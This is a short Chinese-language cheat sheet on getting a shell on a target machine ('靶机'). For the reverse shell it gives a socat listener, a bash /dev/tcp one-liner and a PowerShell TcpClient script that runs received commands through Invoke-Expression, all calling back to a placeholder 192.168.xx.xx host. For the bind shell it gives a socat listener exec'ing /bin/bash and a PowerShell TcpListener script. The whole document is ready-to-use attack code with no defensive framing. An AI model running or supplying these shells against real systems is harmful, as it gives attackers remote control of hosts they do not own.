# 反弹 shell
### 反向 shell
* 本地监听端口: `socat tcp4-listen:6666 -`
* Linux 靶机连接端口
    ```bash
    bash -i &> /dev/tcp/192.168.xx.xx/6666 0<&1
    ```
* Windows 靶机连接端口
    ```ps1
    $client = New-Object System.Net.Sockets.TcpClient("192.168.xx.xx", 6666)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    while ($client.Connected) {
        $writer.Write("PS> ")
        $command = $reader.ReadLine()
        $output = Invoke-Expression ". { $command } 2>&1" | Out-String
        $writer.WriteLine($output)
    }
    $client.Close()
    ```
### 正向 shell
* Linux 靶机监听端口
    ```bash
    socat tcp4-listen:6666,reuseaddr,fork exec:/bin/bash,pty,stderr,setsid,sigint,sane
    ```
* Windows 靶机监听端口
    ```ps1
    $listen = [System.Net.Sockets.TcpListener]6666
    $listen.Start()

    while ($true) {
        $client = $listen.AcceptTcpClient()
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        while ($client.Connected) {
            $writer.Write("PS> ")
            # 只接受单行命令
            $command = $reader.ReadLine()
            # 客户端退出 PowerShell 使用 break 而非 exit
            $output = Invoke-Expression ". { $command } 2>&1" | Out-String
            $writer.WriteLine($output)
        }
        $client.Close()
    }

    $listen.Stop()
    ```
* 本地连接端口: `socat - tcp4:192.168.xx.xx:6666`